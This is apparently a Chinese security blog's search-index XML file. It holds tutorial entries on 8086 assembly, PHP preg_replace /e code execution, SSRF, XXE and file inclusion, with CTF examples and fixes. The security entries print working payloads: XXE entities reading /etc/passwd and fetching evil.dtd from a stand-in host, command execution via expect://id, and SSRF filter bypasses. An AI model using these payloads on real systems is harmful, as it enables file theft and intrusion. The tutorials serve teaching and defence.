<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[基础汇编]]></title>
    <url>%2F2019%2F11%2F18%2F%E5%9F%BA%E7%A1%80%E6%B1%87%E7%BC%96%2F</url>
    <content type="text"><![CDATA[8086汇编语言指令大致分为以下几类 一、传送类指令 二、算数运算类指令 三、位操作指令 四、串操作指令 五、控制转移类指令 六、处理器控制类指令 七、汇编指令伪指令 指令简介传送类数据传送12MOV 目的操作数，源操作数XCHG 目的操作数，源操作数 //把源和目的操作数交换数值 有效地址传送1234LEA 目的操作数，源操作数把源操作数的偏移地址送目的操作数，源操作数必须是一个内存操作数，目的操作数必须是16位通用寄存器 堆栈指针操作指令堆栈是一块特殊的存储器区域，这块区域是以先进后出的方式工作，系统为此提供了特殊的指针SP，和段寄存器SS主要特点是： 1234567891011121314151617181920212223242526272829（1）堆栈是以字方式操作的（2）压入堆栈。①先修改指针：SP=SP -2②再存入一个字（3）弹出堆栈。①先弹出一个字②再修改指针：SP=SP +2（4）入栈指令PUSH格式：PUSH 操作数该指令为数据入栈指令即将操作数指定的一个字节的内容传送至SP所指的栈顶寻址方式有寄存器寻址(段寄存器SS除外)和存储器寻址，不能用立即数作操作数。该指令不影响标志位。过程：首先，堆栈SP=SP-2然后，操作数的高位字节——&gt;存入((SP)+1)单元中操作数的低位字节——&gt;送入(SP)（5）出栈指令：POPPOP 操作数将SP所指的栈顶内容传送至操作数指定的一个字。寻址方式有：寄存器寻址(段寄存器SS除外)和存储器寻址不能用立即数作操作数。该指令不影响标志位。过程：首先堆栈((SP)+1)单元字节——&gt;操作数的高字节位，(SP)单元字节——&gt;操作数的低位字节。然后SP=SP-2 输入输出指令IN 输入指令 1IN AL,63H ; 将端口地址为63H的一个字节内容输入到AL OUT 输出指令 1OUT 66H,AL ；将AL内容送端口地址66H的单元中 位操作指令123456789101112TEST 测试.(两操作数作与运算,仅修改标志位,不回送结果).SHL 逻辑左移.SAL 算术左移.(=SHL)SHR 逻辑右移.SAR 算术右移.(=SHR)ROL 循环左移.ROR 循环右移.RCL 通过进位的循环左移.RCR 通过进位的循环右移.以上八种移位指令,其移位次数可达255次.移位一次时, 可直接用操作码. 如 SHL AX,1.移位&gt;1次时, 则由寄存器CL给出移位次数. 串操作指令12345678910111213141516171819202122DS:SI 源串段寄存器 :源串变址.ES:DI 目标串段寄存器:目标串变址.CX 重复次数计数器.AL/AX 扫描值.D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量.Z标志 用来控制扫描或比较操作的结束.MOVS 串传送.( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. )CMPS 串比较.( CMPSB 比较字符. CMPSW 比较字. )SCAS 串扫描.把AL或AX的内容与目标串作比较,比较结果反映在标志位.LODS 装入串.把源串中的元素(字或字节)逐一装入AL或AX中.( LODSB 传送字符. LODSW 传送字. LODSD 传送双字. )STOS 保存串.是LODS的逆过程.REP 当CX/ECX&lt;&gt;0时重复.，也就是直到CX=0时结束REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复.REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复.REPC 当CF=1且CX/ECX&lt;&gt;0时重复.REPNC 当CF=0且CX/ECX&lt;&gt;0时重复. 控制转移类指令123456789101112131415161718192021222324252627282930313233JMP 无条件转移指令CALL 过程调用RET/RETF过程返回.条件转移：( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )JA/JNBE 不小于或不等于时转移.JAE/JNB 大于或等于转移.JB/JNAE 小于转移.JBE/JNA 小于或等于转移.以上四条,测试无符号整数运算的结果(标志C和Z).JG/JNLE 大于转移.JGE/JNL 大于或等于转移.JL/JNGE 小于转移.JLE/JNG 小于或等于转移.以上四条,测试带符号整数运算的结果(标志S,O和Z).JE/JZ 等于转移.JNE/JNZ 不等于时转移.JC 有进位时转移.JNC 无进位时转移.JNO 不溢出时转移.JNP/JPO 奇偶性为奇数时转移.JNS 符号位为 &quot;0&quot; 时转移.JO 溢出转移.JP/JPE 奇偶性为偶数时转移.JS 符号位为 &quot;1&quot; 时转移.LOOP CX不为零时循环.LOOPE/LOOPZ CX不为零且标志Z=1时循环.LOOPNE/LOOPNZ CX不为零且标志Z=0时循环.JCXZ CX为零时转移.JECXZ ECX为零时转移.INT 中断指令INTO 溢出中断IRET 中断返回 处理器控制类指令123456789101112CLC（进位位置0指令）CMC（进位位求反指令）STC（进位位置为1指令）CLD（方向标志置1指令）STD（方向标志位置1指令）CLI（中断标志置0指令）STI（中断标志置1指令）WAIT（等待）ESC（交权）LOCK（封锁总线）NOP（无操作）HLT（暂停） 汇编指令伪指令1234567DW 定义字(2字节).PROC 定义过程.ENDP 过程结束.SEGMENT 定义段.ASSUME 建立段寄存器寻址.ENDS 段结束.END 程序结束. 寄存器与标志位CF(Carry Flag)——进位标志位。 12当执行一个加法(或减法)运算，使最高位产生进位(或借位)时CF为1，则为0。 PF(Parity Flag)——奇偶标志位。 123该标志位反映运算结果中1的个数是偶数还是奇数。当指令执行结果的低8位中含有偶数个1时PF=1；否则PF=0。 AF(Auxiliary carry Flag)——辅助进位标志位。 1234当执行一个加法(或减法)运算，使结果的低4位向高4位有进位(或借位)时，AF=1；否则AF=0。ZF(Zero Flag)——零标志位。若当前的运算结果为零，ZF=1；否则ZF=0。 SF(Sign Flag)——符号标志位。 1它和运算结果的最高位相同。 OF(Overflow Flag)——溢出标志位。 1当补码运算有溢出时，OF=1；否则OF=0。 3个控制标志位用来控制CPU的操作，由指令进行置位和复位。 DF(Direction Flag)——方向标志位。 123它用以指定字符串处理时的方向，当该位置“1”时，字符串以递减顺序处理，即地址以从高到低顺序递减。反之，则以递增顺序处理。 IF(Interrupt enable Flag)——中断允许标志位。 123它用来控制8086是否允许接收外部中断请求。若IF=1，8086能响应外部中断，反之则不响应外部中断。注意：IF的状态不影响非屏蔽中断请求(NMI)和CPU内部中断请求 TF(Trap Flag)——跟踪标志位。 1234它是为调试程序而设定的陷阱控制位。当该位置“1”时，8086 CPU处于单步状态，此时CPU每执行完一条指令就自动产生一次内部中断。当该位复位后，CPU恢复正常工作。 edi 相当于 nop,例如 mov edi edi,之所以用 edi 不用 nop 是因为执行两个 edi 比执行两个 nop 快很多 下面在具体的程序中分析汇编代码。 初始化变量1234567string a #字符串变量int a # 整型变量Boolean a #布尔型变量char a #字符型变量double a #双精度变量float a #单精度变量char array a #字符型数组 C代码： 1234567string stringvar=&quot;Hello World&quot;；int intvar=100;bool boolvar=false;char charvar=&apos;B&apos;;double doublevar=3.1415; float floatvar=3.14159265;char carray[]=&#123;&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&quot;,&apos;e&apos;&#125;; 对应的初始化汇编代码：变量分配：C++字符串的启动：初始化字符串需要调用内置函数进行 基本输出这是一段C++的输出代码： 12345678910111213printf（&quot;Hello String Literal&quot;）；_asm&#123;nop&#125;printf（&quot;%s&quot;，stringvar）；_asm&#123;nop&#125;printf（&quot;%i&quot;，intvar）；_asm&#123;nop&#125;printf（&quot;%c&quot;，charvar）；_asm&#123;nop&#125;printf（&quot;%f&quot;，doublevar）；_asm&#123;nop&#125;printf（&quot;%f&quot;，floatvar）；_asm&#123;nop&#125;printf（&quot;%c&quot;，carrays[3]); 字符串文字的汇编代码： 123push offset aHelloStringlit;&quot;Hello String Literal&quot;call jprintf add esp,4 字符串文字被压入堆栈作为printf函数的参数被调用一个变量的输出： 12345mov eax,[ebp+intvar]push eax push offset aI_0 ;&quot;%i&quot;call jprintf add esp,8 首先将变量intvar移入EAX寄存器，然后将其用指示整数输出的字符串文字‘’%i’一起送入堆栈中。然后将这些变量从堆栈中取出，并作为在调用printf函数时的参数。 数学运算包括： 加法 减法 乘法 除法 按位与 按位或 按位异或 按位非 按位右移 按位左移 用这段代码时进行数学运算： 1234567891011121314void mathfunctions（）&#123;//mathematical operations intA=10；intB=15；int add=A+B；int sub=A-B；int mult=A*B；int div=A/B；int and=A&amp;B；int or=A|B；int xor=AAB；int not=~A；int rshift=A&gt;&gt;B；int 1shift=A&lt;&lt;B； 我们对每个函数分开分析。首先我们将A表示为十六进制oA，表示十进制10，B表示为十六进制的oF，表示十进制的15。 12mov [ebp+A],0Ahmov [ebp+B],OFh add加法汇编： 123mov eax,[ebp+A]add eax,[ebp+B]mov [ebp+add], eax sub减法汇编: 123mov eax,[ebp+A]sub eax,[ebp+B]mov [ebp+sub],eax imul乘法汇编： 123mov eax,[ebp+A]imul eax,[ebp+B]mov [ebp+mult],eax idiv除法汇编,使用’cdq’来加倍EAX的大小，以便我们可以适应除法运算的输出。： 1234mov eax,[ebp+A]cdq idiv [ebp+B]mov [ebp+div],eax and按位与运算： 123mov eax,[ebp+A]and eax,[ebp+B]mov [ebp+and],eax or按位或运算： 123mov eax,[ebp+A]or eax,[ebp+B]mov [ebp+or],eax xor按位异或运算： 123mov eax,[ebp+A]xor eax,[ebp+B]mov [ebp+xor],eax not按位非运算： 123mov eax,[ebp+A]not eax mov [ebp+not],eax shl进行按位左移： 1234mov eax,[ebp+A]mov ecx,[ebp+B]shl eax,clmov [ebp+lshift],eax 函数调用3种不同类型的函数： 基本的空函数 返回整数的函数 接受参数的函数 分别是下面这段代码对应的三个函数： 12345678910111213void newfunc()&#123;printf(&quot;Hello!I&apos;m a new function!&quot;);&#125;int newfuncret()&#123;int A=rand();return A;&#125;void funcparams(int iparam,string sparam,char cparam)&#123;// function with parameters printf(&quot;%i \n&quot;,iparam);printf(&quot;%s \n&quot;,sparam); printf(&quot;%c\n&quot;,cparam);&#125; 基本的空函数：123void newfunc()&#123;printf(&quot;Hello!I&apos;m a new function!&quot;);&#125; 1call newfunc 看汇编代码： 12345678910111213141516171819202122232425newfunc_func proc near var_C0=byte ptr-ec0h push ebp mov ebp, esp sub esp, oc0h push ebxpush esipush edi1ea edi,[ ebp+var_Ce]mov ecx,30h mov eax, 0ccccccch rep stosdpush offset aHelloIMANewFun;&quot;Hello!I&apos;m a new function!&quot;call j__printf add esp,4pop edipop esipop ebxadd esp, oc0h cmp ebp, esp call j__RTC_CheckEsp; compiler security checkmov esp, ebp pop ebp retn ; return to last position, not return with item.newfunc_func endp 这个函数使用了retn操作码，但只是返回到了上一个位置。（这样程序能够在函数调用完成后继续。） 返回整数的函数123int newfuncret()&#123;//new function that returns something int A=rand(); return A; 1call newfuncret 汇编代码如下： 12345678910111213141516171819202122232425262728newfuncret_func proc near var_CC=byte ptr-0CCh A=dword ptr-8push ebp mov ebp,esp sub esp,0CCh push ebxpush esipush edi1ea edi,[ebp+var_CC]mov ecx,33h mov eax,0CCCCCCCCh rep stosd mov esi,esp call ds:__imp__rand ; call rand()cmp esi,esp call j__RTC_CheckEsp;compiler security check mov [ebp+A],eax ;set the A to result of rand()mov eax,[ebp+A] ;set EAX to A to return later pop edipop esipop ebx add esp,0CCh cmp ebp,esp call j__RTC_CheckEsp ;compiler security check mov esp,ebp pop ebpretn ;When retn is called,it returns with the value in EAX newfuncret func endp 首先为A变量分配空间。然后调用rand（）函数，将其返回值放入EAX寄存器。接下来，将EAX变量移入A变量空间，将A做为rand（）的结果。最后，将A变量移入EAX，以便函数可以将其用作返回值。 接受参数的函数123456void funcparams(int iparam,string sparam,char cparam)&#123;// function with parameters printf(&quot;%i \n&quot;,iparam);printf(&quot;%s \n&quot;,sparam); printf(&quot;%c\n&quot;,cparam);&#125; 调用申明: 1234567891011movzx eax,[ebp+charvar]push eax ;cparam sub esp,1Ch mov ecx,esp ;this mov [ebp+var_14C],esp1ea edx,[ebp+stringvar]push edx ;_Right call j??0$basic_stringeou?schar_traitsep@std@@V?$allocator@0@20@std@CQAE@ABve1@@Z mov [ebp+var_160],eax mov eax,[ebp+intvar]call funcparams 先将变量放入寄存器中，然后将寄存器压入栈中，最后调用该函数。函数汇编代码： 123456789101112131415161718192021222324252627282930313233343536373839404142funcparams_func proc near var_C8=byte ptr-0c0h iparam=dword ptr 8sparam= std:：basic_string&lt;char，std:：char_traitscchar&gt;，std:：allocator&lt;char&gt;&gt;ptr cparam= byte ptr 28h mov ebp，esp sub esp，8c8h push ebxpush esipush edi lea edi，[ebprvar_ce]mov ecx，30h sov eax，eccccCCCCh rep stosd sov eax，[ebp+iparam]push eax push offset_Format；&quot;%i\n&quot;call j_printf add esp，8sub esp，1Ch mov ecx，71ea esi，[ebp+sparam]mov edi，esp rep sovsd push offset a5 ；“%s\n”call jprintf add esp，20h movsx eax，[ebp+cparam]push eax push offset ac ；“%c\n”call j_printf add esp，8lea ecx，[ebp+sparam] ；this cal1 j？1isbasic_stringeou？schar_traitse0gstdgv？sallocatorgog2e0stde@QAEexz pop edipop esipop ebx add esp，ac8h cmp ebp，esp call jRTC_CheckEsp mov esp，ebp pop ebp funcparams func endp 这个函数是接受一个字符串，一个整数和一个字符，并使用printf打印出来。首先在函数顶部分配3个变量，然后将这些变量作为printf函数的参数压入堆栈。 参考资料：https://www.kancloud.cn/wintry/python3/742485https://www.kancloud.cn/wintry/python3/742484]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>CTF 逆向</tag>
        <tag>汇编语言</tag>
        <tag>CTF PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[preg_replace()代码执行漏洞]]></title>
    <url>%2F2019%2F11%2F15%2Fpreg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 关于preg_replace()函数preg_replace：(PHP 5.5) 功能 ： 函数执行一个正则表达式的搜索和替换 定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。参数说明： 123456789$pattern: 要搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$subject: 要搜索替换的目标字符串或字符串数组。$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。$count: 可选，为替换执行的次数。 0x01 漏洞的产生$pattern 存在 /e 模式修正符，允许代码执行 /e 模式修正符，是 *preg_replace() * 导致 $replacement 部分当做php代码来执行。 实例11echo preg_replace(&apos;/test/e&apos;,$_GET[&apos;r&apos;],&apos;atest&apos;) 这个preg_replace函数的意思为，将第一个参数匹配到的内容替换为第二个参数，操作的目标字符串是第三个参数 以上述代码为例，若没有/e，则代码的功能为将 atest中的test换为$_GET[&quot;r&quot;] 当使用/e参数时，代码的功能为将atest中的test换为$_GET[“h”]的执行结果，当$_GET[‘r’]为phpinfo()时就直接执行了 构造： ?r=phpinfo()，成功获得phpinfo 212345&lt;? php function getpages()&#123;&#125;echo preg_replace(&quot;/123(.*)123/ies&quot;,&apos; getpages(&quot;\1&quot;)&apos;,$_GETI&quot;pages&quot;]);?&gt; payload:?pages=123{${phpinfo}} 3123&lt;? function test($str) &#123; &#125; echo preg_replace(&quot;/prefix(.+?)suffix/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]); /i 表示不区分大小写 /s 表示正则中的.匹配所有字符，包括换行 解释一下代码的意思，如果输入的$_GET[“h”]为aaaprefixphpinfo()suffix 首先使用第一个参数匹配第三个参数，匹配到的部分替换为第二个参数执行的结果，第二个参数中的\1为第一个参数中的(.+?)匹配到的内容 所以会执行test(&quot;phpinfo()&quot;) 当$_GET[&quot;h&quot;]为prefix${phpinfo()}suffix时就会执行test(&quot;${phpinfo()}&quot;)，因为双引号的缘故，phpinfo得以执行 0x02 避免preg_replace /e修饰符在PHP5.5.0起废弃 官方推荐使用preg_replace_callback()代替/e php7.0.0 起不再支持/e preg_replace_callback：执行一个正则表达式搜索并且使用一个回调进行替换 说明preg_replace_callback ( mixed $pattern , callable $callback , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed这个函数的行为除了 可以指定一个 callback 替代 replacement 进行替换 字符串的计算，其他方面等同于 preg_replace()。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF漏洞]]></title>
    <url>%2F2019%2F11%2F11%2FSSRF%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[SSRF 即Server-Side Request Forgery服务器端请求伪造攻击，利用漏洞伪造服务器端发起请求，从而突破客户端获取本身得不到的数据，SSRF攻击的目标是从外网无法访问的内部系统。 SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。 假设A网站是一个所有人都可以访问的外网网站，B网站是一个他们内部的网站，普通用户只能访问A网站，不能访问B网站，但是我们可以通过A网站做中间人，伪造身份发送请求，就可以访问B网站，近而达到攻击B网站的目的。www.shiyanbar.com/xxx.php?image=www.abc.com/.jpg 获取a网站一个图片那么这里如果服务器端没有对请求获取图片的参数 image 做出严格限制和过滤，那么它就有可能导致获取其它服务器数据www.shiyanbar.com/xxx.php?image=XXX //XXX为利用方法 可能出现的地方123456789101112131.社交分享功能：获取超链接的标题等内容进行显示2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览3.在线翻译：给网址翻译对应网页的内容4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作8.数据库内置功能：数据库的比如mongodb的copyDatabase函数9.邮件系统：比如接收邮件服务器地址10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） 绕过方法1、更改IP地址写法因为可能通过过滤掉内网IP的方式。可以通过进制绕过：192.168.0.1的各种进制 1234567(1)、8进制格式：0300.0250.0.1(2)、16进制格式：0xC0.0xA8.0.1(3)、10进制整数格式：3232235521(4)、16进制整数格式：0xC0A80001 2、利用解析URL所出现的问题在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。http://www.baidu.com@192.168.0.1/当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。3、URL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/4、利用302跳转xip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)192.168.0.1.xip.io，就会自动重定向到192.168.0.1。 例子easygallery-1查看源码，发现“flag”: 接着在下面发现链接：http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg SSRF利用，直接payload拿试试：http://xxxx/gallery.php?path=file:///flag 发现为空，这里忽略了一个点：题目应该是限制了后缀jpg,尝试绕过，这里用到一个点，即%23或？，HTML中起连接作用，而且不影响读取文件 最终payload:http://xxxx/gallery.php?path=file:///flag%23.jpg easygallery-2与1基本类似，但是再次用原来payload会发现报错：scheme error!猜测后端禁用了file协议。。。 抓包发现是POST方式，猜测是命令执行最终payload:http://xxxx/download.php?f=http://127.0.0.1/download.php file:///flag 1.jpg 漏洞修复1.禁止跳转 2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 5.限制请求的端口为http常用的端口，比如 80、443、8080、8090 6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 参考资料：https://www.freebuf.com/articles/web/135342.htmlhttps://xz.aliyun.com/t/2115]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE漏洞]]></title>
    <url>%2F2019%2F11%2F10%2FXXE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 XML基础可扩展标记语言（英語：Extensible Markup Language，简称：XML）是一种标记语言。 标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。 XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。如图所示： xxe漏洞与DTD文档相关。 DTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。内部声明DTD: 1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD: 1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; DTD文档中重要的关键字如下： 123DOCTYPE（DTD的声明）ENTITY（实体的声明）SYSTEM、PUBLIC（外部资源申请） 实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体按类型主要分为以下四种： 内置实体 (Built-in entities)字符实体 (Character entities)通用实体 (General entities)参数实体 (Parameter entities)实体根据引用方式，还可分为内部实体与外部实体。 实体类别内部实体： 1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 外部实体: 1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体： 1&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt; 或者 1&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。实例演示：除参数实体外实体+内部实体 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY name &quot;sz&quot;&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt; 实例演示：参数实体+外部实体 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt; %name;]&gt; 注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。实例：外部实体 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt; xxe漏洞主要是利用了DTD引用外部实体导致的漏洞 0x01 XXE漏洞介绍XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，允许引用外部实体，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 XXE漏洞检测先检测是否解析XML 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE hello [ &lt;!ENTITY name &quot;Hello,hacker!&quot;&gt;]&gt; &lt;root&gt;&amp;name;&lt;/root&gt; 如果页面输出了Hello,hacker!，说明xml文件可以被解析。然后检测服务器是否支持DTD引用外部实体： 12345&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % name SYSTEM &quot;http://localhost/index.html&quot;&gt; %name; ]&gt; 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。 0x02 XML外部实体注入（漏洞利用）恶意引入外部实体1（读取文件）12345&lt;? xml version=&quot;1.0&quot;?&gt;&lt;! DOCTYPE a[&lt;! ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;c〉&amp;b;&lt;/c&gt; 恶意引入外部实体2（读取文件）XML内容： 12345&lt;? xml version=&quot;1.0&quot;?&gt;&lt;! DOCTYPE a[&lt;! ENTITY % d SYSTEM &quot;http://xxx. com/evil. dtd&quot;&gt;%d;&lt;c&gt;&amp;b;&lt;/c&gt; DTD文件(evil.dtd)内容： 1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 恶意引入外部实体3（读取文件）XML内容： 12&lt;? xml version=&quot;1.0&quot;?&gt;&lt;! DOCTYPE a SYSTEM&quot;http://xxx. com/evil. dtd&quot;&gt; DTD文件(evil.dtd)内容： 1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 执行系统命令1234567&lt;? xmL version=&quot;1.0&quot;?&gt;&lt;! DOCTYPE ANY[&lt;! ENTITY xxe SYSTEM&quot;expect://id&quot;&gt;&lt;x&gt;&amp; xxe;&lt;/x&gt;EOF; $data=simplexml_load_string($xml); print_r($data); 探测内网端口12345&lt;? xml version=&quot;1.0&quot;?&gt;&lt;! DOCTYPE ANY[&lt;! ENTITY XXe SYSTEM&quot;http://192.168.1.1:81/mark4z5&quot;&gt;&lt;x&gt;&amp; xxe;&lt;/x&gt;EOF; Sdata=simplexml_1oad_string($xml); print_r($data); 该例子是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。 0x03 实例http://web.jarvisoj.com:9882/源码：抓包发现客户端以json形式发送了数据，服务端返回了客户端的内容利用XXE外部实体 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe[&lt;!ENTITY file SYSTEM &quot;file://home/ctf/flag.txt&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt; 0x04 XXE漏洞修复与防御1.使用开发语言提供的禁用外部实体的方法PHP： 1libxml_disable_entity_loader(true); JAVA: 12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python： 12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2.过滤用户提交的XML数据过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 参考资料：https://security.tencent.com/index.php/blog/msg/69https://thief.one/2017/06/20/1/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>XXE</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F2019%2F11%2F09%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 文件包含与文件包含漏洞文件包含是指，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。文件包含还有另外一个名称，那就是代码重用。我们若是需要修改页面，只需要修改一个头部代码文件就可以了，其他上万个页面将会全部对应改变。 文件包含漏洞是指客户端（一般为浏览器）用户通过输入控制动念包含在版务器的文件，从而导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含LFI和远程文件包含RFI两种形式 0x01 文件包含函数文件包含的函数： 1234567vrequire()require_once()include()include_once() include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 0x02 漏洞产生原因文件包含函数加载的参数没有经过过滤或者严格的定义，用户可以操作一些敏感文件，文件泄露和恶意代码注入，可以被用户控制，包含其他恶意文件，执行非预期的代码当包含文件在服务器本地上，就形成本地文件包含，当包含的文件在第三方服务器是，就形成可远程文件包含。例子： filename参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改filename的值，执行非预期的操作。 0x03 本地文件包含本地文件包含LFI也即Local File Inclusion，其特性是可包含任意类型的文件，当被包含的文件书写符合php书写规范，即（&lt;？php..…….代码.……？&gt;或&lt;？.…代码..？&gt;）时，不论文件后缀是什么，都可以解析其中的php代码，当书写规范不符合时，则以文本形式输出。测试： 执行结果： 0x04 远程文件包含远程文件包含RFI也即Remote File Inclusion，其基本原理与本地文件包含LFI类似，区别只是被包含的文件由原来的本地文件路径变为远程文件路径。其特性是可包含任意类型的文件，并且如果被包含文件中有类似”&lt;？php…（省略号为php代码）？&gt;”或“&lt;？.…（省略号为php代码）？&gt;”这2种形式的字符串，则在包含时会执行字符串中的PHP代码。有两个关键函数：allow_url_fopen = On（是否允许打开远程文件）allow_url_include = On（是否允许include/require远程文件） 前提：需要开启allow_url_fopen，默认关闭。示例：include.php新建file.txt 123&lt;?php echo &quot;hello,hacker&quot;;?&gt; 访问http://www.xxxx.com/include.php?file=http://www.xxxx.com/file.txt执行结果将输出hello world。 0x05 文件包含利用读取敏感信息通过目录遍历可以获取到系统中其他文件的内容： 常见敏感信息路径Windows系统1234567891011c:\boot.ini // 